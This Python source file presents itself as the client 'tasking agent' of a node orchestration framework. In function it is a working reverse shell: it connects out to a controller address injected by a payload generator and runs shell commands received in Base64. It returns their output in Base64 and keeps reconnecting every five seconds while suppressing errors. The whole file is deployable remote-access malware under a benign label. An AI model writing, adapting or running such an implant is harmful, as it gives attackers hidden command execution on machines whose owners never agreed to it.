#!/usr/bin/env python3
"""
Distributed Node Orchestration Framework — Tasking Agent (Client)

Lightweight agent that connects to the Controller, receives command strings,
executes them locally, and sends the Base64-encoded output back.

NOTE: The <<HOST>> and <<PORT>> placeholders are replaced by the Generator
      at provisioning time.
"""

import base64
import socket
import subprocess
import sys
import time

# ── Connection details (injected by the Generator) ───────────────────────────
HOST = "<<HOST>>"
PORT = <<PORT>>

RECONNECT_DELAY = 5  # seconds between reconnection attempts


# ── Helpers ───────────────────────────────────────────────────────────────────
def b64_encode(data: str) -> bytes:
    """Encode a string to Base64, terminated with a newline delimiter."""
    return base64.b64encode(data.encode()) + b"\n"


def b64_decode(data: bytes) -> str:
    """Decode Base64 bytes back to a string."""
    return base64.b64decode(data.strip()).decode(errors="replace")


def recv_until_newline(sock: socket.socket) -> bytes:
    """Receive data from the socket until a newline delimiter is found."""
    buffer = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            raise ConnectionError("Connection closed by controller.")
        buffer += chunk
        if b"\n" in buffer:
            return buffer.split(b"\n", 1)[0]


def execute_command(command: str) -> str:
    """Execute a shell command and return combined stdout + stderr."""
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=120,
        )
        output = result.stdout + result.stderr
        return output if output.strip() else "[*] Command executed — no output."
    except subprocess.TimeoutExpired:
        return "[!] Command timed out after 120 seconds."
    except Exception as exc:
        return f"[!] Execution error: {exc}"


# ── Main loop ────────────────────────────────────────────────────────────────
def main():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((HOST, PORT))

            while True:
                # Receive a Base64-encoded command from the controller
                raw = recv_until_newline(sock)
                command = b64_decode(raw)

                if not command:
                    continue

                # Execute and return the result
                output = execute_command(command)
                sock.sendall(b64_encode(output))

        except (ConnectionError, ConnectionRefusedError, OSError):
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass

        # Wait before attempting to reconnect
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
